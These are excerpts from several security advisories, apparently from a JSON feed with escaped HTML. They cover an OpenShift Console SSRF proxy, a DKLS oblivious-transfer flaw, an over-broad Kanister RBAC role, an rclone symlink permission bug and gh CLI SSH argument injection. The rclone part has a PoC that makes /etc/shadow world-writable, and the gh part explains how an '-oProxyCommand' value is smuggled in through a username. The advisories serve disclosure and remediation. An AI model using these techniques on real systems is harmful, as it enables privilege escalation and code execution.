The server is considered to be in a privileged network position and can often reach exposed services that aren't readily available to clients due to network filtering. Leveraging such an attack vector, the attacker can have an impact on other services and potentially disclose information or have other nefarious effects on the system.\nThe /api/dev-console/proxy/internet endpoint on the OpenShit Console allows authenticated users to have the console's pod perform arbitrary and fully controlled HTTP(s) requests. The full response to these requests is returned by the endpoint.\nWhile the name of this endpoint suggests the requests are only bound to the internet, no such checks are in place. An authenticated user can therefore ask the console to perform arbitrary HTTP requests from outside the cluster to a service inside the cluster.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6538\">https://nvd.nist.gov/vuln/detail/CVE-2024-6538</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-6538\">https://access.redhat.com/security/cve/CVE-2024-6538</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2296057\">https://bugzilla.redhat.com/show_bug.cgi?id=2296057</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v3w7-g6p2-mpx7\">https://github.com/advisories/GHSA-v3w7-g6p2-mpx7</a></li>\n</ul>\n",

Secret share recovery attack</h3>\n<p>If the base OT setup of the protocol is reused for another execution of the OT extension, then a malicious participant can extract a bit of the secret of another participant. By repeating the execution they can eventually recover the whole secret.</p>\n<p>Therefore, unlike our comments suggested, you <strong>must not reuse an OT setup</strong> for multiple protocol executions. </p>\n<p>We're adding a warning in the code:</p>\n<p><a href=\"https://github.com/taurushq-io/multi-party-sig/blob/9e4400fccee89be6195d0a12dd0ed052288d5040/internal/ot/extended.go#L114\">https://github.com/taurushq-io/multi-party-sig/blob/9e4400fccee89be6195d0a12dd0ed052288d5040/internal/ot/extended.go#L114</a></p>\n<h3 id=\"2-invalid-security-proof-due-to-incorrect-operator\">2. Invalid security proof due to incorrect operator</h3>\n<p>The original 2018 version of the DKLS had a typo in the OT extension protocol when computing the check value in the OT extension: the paper noted a XOR whereas it should be a field multiplication. This erroneous behavior was implemented <a href=\"https://github.com/taurushq-io/multi-party-sig/blob/4d84aafb57b437da1b933db9a265fb7ce4e7c138/internal/ot/extended.go#L188\">in our code</a>. </p>\n<p>The proof of security fails in this case. No concrete attack is known, however.</p>\n<p>The <a href=\"https://eprint.iacr.org/2018/499.pdf\">2023 update</a> of the DKLS paper reported that typo and updated the protocol definition.</p>\n<p>As of 20241124, patching is in progress (branch <a href=\"https://github.com/taurushq-io/multi-party-sig/tree/otfix\">otfix</a>), but not merged to the main branch yes as the tests fail to pass. We're troubleshooting the issue and will merge into the main branch when it's resolved.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not reuse an OT setup, to eliminate the secret recovery attack.</p>\n<p>Avoid using our implementation of the DKLS protocol until we patch it, and maybe avoid DKLS altogether.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thank you to the Coinbase researchers Yi-Hsiu Chen and Samuel Ranellucci for discovering these issues and providing a comprehensive write-up.

The \"edit\" ClusterRole is one of Kubernetes default-created ClusterRole, and it have create/patch/udpate verbs of daemonset resources, create verb of serviceaccount/token resources, and impersonate verb of serviceaccounts resources. If a malicious user can access the worker node which has this component, he/she can:</p>\n<p>For the create/patch/update verbs of daemonset resources, the malicious user can abuse it to create or modify a set of Pods to mount a high-privilege service account (e.g., the cluster-admin service account). After that, he/she can abuse the high-privilege SA token of created Pod to take over the whole cluster.</p>\n<p>For the create verb of serviceaccount/token resources, a malicious user can abuse this permission to generate new Service Account tokens and use them to operate with high-privilege roles, such as cluster administrators. These tokens can be used to access and manipulate any resources within the cluster.</p>\n<p>For the impersonate verb of serviceaccounts resources, a malicious user can impersonate high-privilege Service Accounts, thereby gaining access to roles such as cluster administrators. This enables the attacker to perform all actions that the high-privilege account can, including creating, modifying, and deleting critical resources within the cluster.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>We have discussed in the \"Details\" section</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Privilege escalation</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Currently kanister helm chart provides rbac.create flag (true by default), which controls whether the rbac rules for kanister service account will be created <a href=\"https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/values.yaml#L17\">https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/values.yaml#L17</a>\nIf this value set to false, the user needs to create rbac rules themselves and they can limit the role bindings for kanister service account, for example scope it to specific namespace.\nService account can also be configured via helm <a href=\"https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/values.yaml#L19\">https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/values.yaml#L19</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kanisterio/kanister/security/advisories/GHSA-h27c-6xm3-mcqp\">https://github.com/kanisterio/kanister/security/advisories/GHSA-h27c-6xm3-mcqp</a></li>\n<li><a href=\"https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/templates/rbac.yaml#L49\">https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/templates/rbac.yaml#L49</a></li>\n<li><a href=\"https://github.com/kanisterio/kanister/wiki/2023%E2%80%9024-Community-Meeting-Notes\">https://github.com/kanisterio/kanister/wiki/2023%E2%80%9024-Community-Meeting-Notes</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43403\">https://nvd.nist.gov/vuln/detail/CVE-2024-43403</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h27c-6xm3-mcqp\">https://github.com/advisories/GHSA-h27c-6xm3-mcqp</a></li>\n</ul>\n",

This vulnerability could enable privilege escalation and unauthorized access to critical system files (e.g., /etc/shadow), compromising system integrity, confidentiality, and availability.</p>\n<p>For instance, an unprivileged user could set a symlink to a sensitive file within their home directory, waiting for an administrator or automated process (e.g., a cron job running with elevated privileges) to copy their files with rclone using the --links and --metadata options. Upon copying, rclone will incorrectly apply chown and chmod to the symlink’s target file rather than just the symlink itself, resulting in ownership and permission changes on the sensitive file.</p>\n<h3 id=\"who-is-affected\">Who is affected</h3>\n<p>If you are not using <code>--metadata</code> <strong>and</strong> <code>--links</code> <strong>and</strong> copying files <strong>to</strong> the local backend you are not affected by this issue.</p>\n<p>If you are using <code>--metadata</code> and <code>-links</code> and copying files to the local backend but not as a superuser, then this will manifest itself as a bug by setting incorrect permissions.</p>\n<p>If you are using <code>--metadata</code> and <code>-links</code> and copying files to the local backend but as a superuser then this could affect you.</p>\n<h3 id=\"details\">Details</h3>\n<p>When copying directories containing symlinks with rclone using the --links and --metadata options, rclone mistakenly applies chown and chmod operations to the target of the symlink instead of the symlink itself. As a result, ownership and permissions on sensitive system files (e.g., /etc/shadow) may be altered if they are the target of any symlink within the copied directory structure. This allows users to affect the permissions and ownership of files they should not have access to, resulting in privilege escalation and potential system compromise.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code># Create a directory to simulate a user home directory\nroot@workstation:~# mkdir -p /tmp/home/user1\nroot@workstation:~# sudo chown user1:user1 /tmp/home/user1\n</code></pre>\n<pre><code># As user1, create a symlink to /etc/shadow within their home directory\nroot@workstation:~# sudo -u user1 ln -s /etc/shadow /tmp/home/user1/shadow_link\n</code></pre>\n<pre><code># List permissions on the original files\nroot@workstation:~# ls -l /tmp/home/user1/shadow_link /etc/shadow\n----------. 1 root  root  1283 Nov  5 13:30 /etc/shadow\nlrwxrwxrwx. 1 user1 user1   11 Nov  5 13:56 /tmp/home/user1/shadow_link -&gt; /etc/shadow\n</code></pre>\n<pre><code># Copy the directory structure with rclone\nroot@workstation:~# rclone copy /tmp/home /tmp/home_new --links --metadata --log-level=DEBUG\n2024/11/05 13:56:53 DEBUG : rclone: Version \"v1.68.1\" starting with parameters [\"rclone\" \"copy\" \"/tmp/home\" \"/tmp/home_new\" \"--links\" \"--metadata\" \"--log-level=DEBUG\"]\n2024/11/05 13:56:53 DEBUG : Creating backend with remote \"/tmp/home\"\n2024/11/05 13:56:53 NOTICE: Config file \"/root/.config/rclone/rclone.conf\" not found - using defaults\n2024/11/05 13:56:53 DEBUG : local: detected overridden config - adding \"{b6816}\" suffix to name\n2024/11/05 13:56:53 DEBUG : fs cache: renaming cache item \"/tmp/home\" to be canonical \"local{b6816}:/tmp/home\"\n2024/11/05 13:56:53 DEBUG : Creating backend with remote \"/tmp/home_new\"\n2024/11/05 13:56:53 DEBUG : local: detected overridden config - adding \"{b6816}\" suffix to name\n2024/11/05 13:56:53 DEBUG : fs cache: renaming cache item \"/tmp/home_new\" to be canonical \"local{b6816}:/tmp/home_new\"\n2024/11/05 13:56:53 DEBUG : Added delayed dir = \"user1\", newDst=&lt;nil&gt;\n2024/11/05 13:56:53 DEBUG : user1/shadow_link.rclonelink: Need to transfer - File not found at Destination\n2024/11/05 13:56:53 DEBUG : user1/shadow_link.rclonelink: md5 = 2fe8599cb25a0c790213d39b3be97c27 OK\n2024/11/05 13:56:53 INFO  : user1/shadow_link.rclonelink: Copied (new)\n2024/11/05 13:56:53 DEBUG : Local file system at /tmp/home_new: Waiting for checks to finish\n2024/11/05 13:56:53 DEBUG : Local file system at /tmp/home_new: Waiting for transfers to finish\n2024/11/05 13:56:53 INFO  : user1: Updated directory metadata\n2024/11/05 13:56:53 INFO  :\nTransferred:             11 B / 11 B, 100%, 0 B/s, ETA -\nTransferred:            1 / 1, 100%\nElapsed time:         0.0s\n\n2024/11/05 13:56:53 DEBUG : 6 go routines active\n</code></pre>\n<pre><code># List permissions again\nroot@workstation:~# ls -l /tmp/home/user1/shadow_link /etc/shadow /tmp/home_new/user1/shadow_link\n-rwxrwxrwx. 1 user1 user1 1283 Nov  5 13:30 /etc/shadow                                                 # Wrong, very wrong.

When developers connect to remote Codespaces, they typically use a SSH server running within a devcontainer, often provided through the <a href=\"https://docs.github.com/en/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/introduction-to-dev-containers#using-the-default-dev-container-configuration\">default devcontainer image</a>.

The <code>-oProxyCommand</code> flag causes <code>ssh</code> to execute the provided command while <code>#</code> shell comment causes any other <code>ssh</code> arguments to be ignored.</p>\n<p>In <code>2.62.0</code>, the remote username information is being validated before being used.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Successful exploitation could lead to arbitrary code execution on the user's workstation, potentially compromising the user's data and system.</p>\n<h3 id=\"remediation-and-mitigation\">Remediation and Mitigation</h3>\n<ol>\n<li>Upgrade <code>gh</code> to <code>2.62.0</code></li>\n<li>Exercise caution when using custom devcontainer images, prefer default or pre-built devcontainers from trusted sources.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cli/cli/security/advisories/GHSA-p2h2-3vg9-4p87\">https://github.com/cli/cli/security/advisories/GHSA-p2h2-3vg9-4p87</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-52308\">https://nvd.nist.gov/vuln/detail/CVE-2024-52308</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-3269\">https://pkg.go.dev/vuln/GO-2024-3269</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2h2-3vg9-4p87\">https://github.com/advisories/GHSA-p2h2-3vg9-4p87</a></li>\n</ul>\n",
